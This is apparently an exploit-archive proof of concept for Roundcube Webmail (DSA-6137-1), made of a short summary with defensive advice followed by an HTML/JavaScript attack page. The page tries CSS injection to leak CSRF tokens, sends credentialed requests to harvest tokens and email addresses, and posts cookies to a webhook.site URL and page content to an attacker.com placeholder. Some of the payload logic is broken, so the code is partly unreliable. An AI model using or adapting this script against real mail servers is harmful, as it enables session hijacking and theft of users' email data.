@@ -1,0 +1,139 @@
+=============================================================================================================================================
+| # Title     : Roundcube Webmail – DSA-6137-1 Related Attack Vectors                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://roundcube.net/                                                                                                      |
+=============================================================================================================================================
+
+[+] Summary    :  This poc demonstrates potential attack vectors targeting Roundcube webmail installations, particularly in environments affected by Debian Security Advisory DSA-6137-1.
+
+The analyzed techniques simulate client-side exploitation scenarios including:
+
+CSS-based data exfiltration attempts
+
+Cross-Site Request Forgery (CSRF) token harvesting
+
+Session riding via authenticated fetch requests
+
+Cookie exposure attempts through JavaScript
+
+External data exfiltration via outbound HTTP requests
+
+The objective of this analysis is defensive awareness. These techniques highlight the importance of:
+
+Keeping Roundcube updated to the latest secure version
+
+Enforcing strict Content Security Policy (CSP)
+
+Implementing HttpOnly, Secure, and SameSite cookie attributes
+
+Proper sanitization of user-controlled content
+
+Strong CSRF token validation
+
+
+[+] POC :
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roundcube Exploit - Proof of Concept</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>استغلال ثغرات Roundcube (DSA-6137-1)</h1>
+    <p>للأغراض التعليمية فقط</p>
+    
+    <div id="exploit">
+        <button onclick="runExploit()">تشغيل الاستغلال</button>
+        <div id="output" style="margin-top:20px; padding:10px; border:1px solid #ccc; min-height:100px; font-family: monospace;"></div>
+    </div>
+    
+    <script>
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const color = type === 'success' ? 'green' : type === 'error' ? 'red' : 'blue';
+            output.innerHTML += `<div style="color: ${color}">${message}</div>`;
+        }
+
+        async function runExploit() {
+            log('بدء استغلال Roundcube...');
+
+            const target = prompt('أدخل رابط Roundcube:', 'http://localhost/roundcube/');
+            if (!target) return;
+
+            log('محاولة حقن CSS...');
+            const cssPayload = `
+                <style>
+
+                    body { background: red !important; }
+
+                    input[name="_token"] {
+                        background: url('${target}/?steal=' + document.querySelector('input[name="_token"]')?.value);
+                    }
+                </style>
+            `;
+
+            log('محاولة تسريب المعلومات...');
+            try {
+
+                const response = await fetch(target + '/?_task=mail&_action=list&_mbox=INBOX', {
+                    credentials: 'include',
+                    headers: {
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                
+                const data = await response.text();
+                log('تم جمع البيانات:', 'success');
+
+                const tokenMatch = data.match(/name="_token" value="([^"]+)"/);
+                if (tokenMatch) {
+                    log('CSRF Token: ' + tokenMatch[1], 'success');
+                }
+                
+                const emailMatch = data.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
+                if (emailMatch) {
+                    log('عناوين بريد: ' + emailMatch.join(', '), 'success');
+                }
+                
+            } catch (error) {
+                log('خطأ: ' + error.message, 'error');
+            }
+
+            log('محاولة إرسال البيانات إلى خادم المهاجم...');
+            try {
+                await fetch('https://webhook.site/your-webhook-url', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        url: target,
+                        cookies: document.cookie,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (e) {
+                log('فشل إرسال البيانات', 'error');
+            }
+            
+            log('اكتمل الاستغلال', 'success');
+        }
+
+        const style = document.createElement('style');
+        style.textContent = `
+            body::after {
+                content: '';
+                display: none;
+                background: url('https://attacker.com/steal?data=' + encodeURIComponent(document.body.innerHTML));
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
